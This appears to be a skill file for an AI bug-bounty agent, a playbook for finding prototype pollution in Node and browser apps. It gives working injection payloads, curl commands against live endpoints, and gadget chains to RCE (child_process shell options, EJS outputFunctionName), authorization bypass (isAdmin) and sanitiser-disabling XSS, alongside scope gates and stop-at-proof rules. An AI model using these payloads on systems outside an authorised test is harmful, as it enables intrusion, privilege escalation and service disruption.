---
name: zp-proto-pollution
description: ZeroProtocol hunter for prototype pollution in JavaScript and TypeScript targets, client-side and server-side. Use when the target is a Node, Express, Next.js or SPA application, when JSON bodies are merged or cloned, when query strings are parsed into objects, or when a DOM sink was found that reads from a shared object. Covers __proto__ and constructor.prototype injection, gadget hunting, and the escalation path to XSS, authorization bypass and RCE.
---

# zp-proto-pollution - poisoning the object every other object inherits

**Phase:** 5 | **Gate:** **active.** `zp-scope check <target>` must exit 0. Exit 1 refuse ·
3 stop · 4 stop.

In JavaScript, every object inherits from `Object.prototype`. If an attacker can write a property
onto it, that property appears on **every object in the process that does not define it** - so
code reading `config.isAdmin`, `options.shell` or `opts.template` suddenly gets the attacker's
value.

**Pollution alone is rarely the finding.** The finding is pollution **plus a gadget**: some code
path that reads the polluted property and does something dangerous with it. Always go find the
gadget before you write anything.

---

## The three injection shapes

```
__proto__            {"__proto__": {"polluted": "zp91234"}}
constructor          {"constructor": {"prototype": {"polluted": "zp91234"}}}
nested/bracket       ?a[__proto__][polluted]=zp91234   ·   ?__proto__.polluted=zp91234
```

Vulnerable sinks are functions that recursively copy attacker-controlled keys: `merge`,
`deepMerge`, `extend`, `clone`, `defaultsDeep`, `set`, `assign`-style helpers, and query-string
parsers that build nested objects (`qs`, `express`'s extended body parser).

---

## Server-side

**1. Pollute, then read back a canary.** The trick is finding an endpoint that reflects an
object property you did not send.

```bash
# JSON body merge
curl -sk -X POST "https://$H/api/settings" -H "Authorization: Bearer $TOK_A" \
  -H 'Content-Type: application/json' \
  -d '{"__proto__":{"zpcanary":"zp91234"}}'

# then look for zpcanary appearing on an unrelated object
curl -sk "https://$H/api/profile" -H "Authorization: Bearer $TOK_A" | grep -o zpcanary

# query-string parser
curl -sk "https://$H/api/search?__proto__[zpcanary]=zp91234"
curl -sk "https://$H/api/search?constructor[prototype][zpcanary]=zp91234"
```

**2. Detect blind pollution by behaviour change.** Most server-side pollution is invisible in the
response, so pollute a property the framework itself reads:

| Polluted key | Observable effect |
|---|---|
| `status` / `statusCode` | responses start returning your code |
| `json spaces` (Express) | JSON response whitespace changes visibly |
| `content-type` | response content type shifts |
| `exposedHeaders`, `allowedHeaders` | CORS headers change -> also `zp-cors` |
| `x-powered-by` | header appears or changes |

A changed `json spaces` value is the classic Express tell: send
`{"__proto__":{"json spaces":10}}`, then request any JSON endpoint and look at the indentation.
It is harmless, unmistakable, and reversible by a restart.

**3. Escalate to a real gadget.** The severity comes from what reads the property:

```
child_process options    {"__proto__":{"shell":"/bin/sh","NODE_OPTIONS":"--require /proc/self/environ"}}  -> RCE
template engine options  {"__proto__":{"outputFunctionName":"x;<payload>;"}}  (EJS-style)   -> RCE
authorization defaults   {"__proto__":{"isAdmin":true}} / {"role":"admin"}                   -> authz bypass
validation bypass        polluting a schema default so a required check passes
path/URL defaults        polluting a base URL or path used by a later fetch              -> zp-ssrf
```

**Confirm RCE gadgets with `id`-equivalent proof only** - see `zp-rce-ssti`'s stop points. Never
chain to a shell.

---

## Client-side

The polluted object lives in the browser, and the gadget is in the page's own JavaScript.

```
https://target.com/?__proto__[zpcanary]=zp91234
https://target.com/#__proto__[zpcanary]=zp91234
https://target.com/?constructor[prototype][zpcanary]=zp91234
```

Then in the console (or via `zp-browser`'s `eval`):

```js
Object.prototype.zpcanary          // "zp91234" => polluted
({}).zpcanary
```

Client-side gadgets that turn pollution into XSS:

```
srcdoc · innerHTML · src · href · template · sanitizer config (ALLOWED_TAGS, RETURN_DOM)
jQuery $.extend then .html() · Vue/Angular template compilation options
script-loader config: a polluted base path that loads your script
```

The high-value combination is **pollution + a sanitiser whose config lives on a plain object** -
polluting `ALLOWED_TAGS` or similar disables the sanitiser for every later call. That is a clean
DOM-XSS chain; confirm execution in a browser via `zp-xss`.

Source hunting from the bundle (`zp-js-secrets` will already have pulled it):

```bash
grep -nE '\b(merge|deepMerge|extend|defaultsDeep|clone|deepClone|setWith|_\.set)\s*\(' js/*.js
grep -nE 'location\.(search|hash)|URLSearchParams|qs\.parse|querystring\.parse' js/*.js
grep -nE 'Object\.freeze\(Object\.prototype\)|\[\s*["\x27]__proto__' js/*.js   # is it defended?
```

---

## Confirm or kill

| Evidence | Verdict |
|---|---|
| `Object.prototype.zpcanary` set in the browser, plus a gadget reaching a sink | **confirmed.** Severity from the sink |
| server-side canary appears on an unrelated object | **confirmed pollution** - now find the gadget |
| `json spaces` / `status` behaviour changes after pollution | confirmed server-side pollution |
| pollution reaches `child_process` options, proven with a benign command | **Critical** - stop at proof |
| pollution flips an authorization default, verified by reading the object back | **confirmed authz bypass** |
| pollution confirmed, **no gadget found** | Low / informational. Report honestly as pollution without demonstrated impact - do not inflate it |
| the canary only appears on the object you sent | not pollution, just input reflection. Killed |
| `Object.freeze(Object.prototype)` or a null-prototype object in use | defended. Killed - record it |
| Node version with `--disable-proto=throw` | killed for `__proto__`; try `constructor.prototype` |
| pollution persists and breaks the app for other users | **stop.** You have caused an availability problem - see below |

**The honest-severity line:** "I polluted the prototype but found no gadget" is a real but Low
finding. Many programs accept it; none accept it dressed up as RCE.

---

## The one operational hazard

Server-side prototype pollution is **process-global and persistent until restart**. Polluting
`status` or a widely-read property on a production server can break responses **for every user**,
which is a denial of service you caused.

So: prefer read-only canaries (`zpcanary`), prefer properties nothing reads, test the visible-but-
harmless ones (`json spaces`) over the behavioural ones (`status`), and **never** pollute a
property the request path depends on. If you notice the app degrading, stop immediately, tell the
program, and say exactly what you set.

Client-side pollution is per-page and harmless by comparison.

---

## High-value patterns

- **An Express API with `extended: true` body parsing** and a `merge`-style settings endpoint.
- **A sanitiser configured from a plain object** - pollution disables it globally -> `zp-xss`.
- **Server-side rendering with a template engine** whose options object is pollutable -> RCE.
- **A shared config object read by an authorization check** - `isAdmin`, `role`, `permissions`.
- **`child_process` calls with an options object** anywhere downstream.
- **Older `lodash`, `jquery`, `merge`, `minimist` versions** - check the lockfile if you have source (`zp-code-audit`).
- **Client-side routers** that merge query parameters into a config object.

---

## Pitfalls

- **Reporting pollution with no gadget as Critical.** It is Low until something reads it.
- **Polluting a property the server depends on**, and taking the app down.
- **Forgetting `constructor.prototype`** when `__proto__` is blocked.
- **Testing only JSON bodies** - query strings, form bodies and nested parameters all reach the same parsers.
- **Missing that the app froze `Object.prototype`** and burning an hour.
- **Confirming client-side XSS without a browser** - `zp-xss` rules apply.
- **Leaving a polluted server** and not telling anyone. Pollution survives until restart.
- **Chaining a `child_process` gadget to a shell.** `id`-equivalent proof, then stop.

---

## Hand off to

DOM sinks and execution proof -> `zp-xss`. `child_process`/template gadgets -> `zp-rce-ssti`.
Polluted authorization defaults -> `zp-authz`. Polluted URLs or fetch defaults -> `zp-ssrf`.
Polluted CORS config -> `zp-cors`. Bundle and dependency analysis -> `zp-js-secrets`,
`zp-code-audit`. Confirmed -> `zp-triage`, `zp-report`.

Class reference cross-checked against `usestrix/strix` (Apache-2.0) `prototype_pollution`.
